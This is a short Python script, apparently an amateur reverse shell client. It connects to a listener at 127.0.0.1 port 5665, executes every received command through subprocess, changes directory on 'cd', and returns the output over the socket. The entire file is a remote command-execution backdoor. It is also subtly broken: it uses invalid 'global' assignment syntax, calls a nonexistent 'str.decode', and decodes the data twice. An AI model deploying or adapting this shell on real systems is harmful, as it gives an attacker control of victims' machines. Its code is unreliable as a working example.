# This code is to make a remote connection to the server
import os
import subprocess # This library is used to run commands on the system
import socket

def socketCreate():
  global sock=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  global host="127.0.0.1"
  global port=5665

def connectionEst():
  global sock
  global host
  global port
  sock.connect((host,port))
  
  while True:
    # receiving the utf8 encoded msg and decodeing it
    cmd=str.decode(sock.recv(1024),"utf 8")
    # subprocess cant change directory and so special check for directory command
    if (str.decode(cmd[:2],"utf 8")=="cd"):
      os.chdir(cmd[3:])
    else:
      # Opening subprocess in the bvackground and executing the command and piping the outpur
      sub=subprocess.Popen(cmd[:],stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
      # Sending back output or eroor if any occured
      sock.send(str.encode(sub.stdout.read()+sub.stderr.read(),"utf 8"))
      
def main():
  socketCreate()
  connectionEst()
main()  
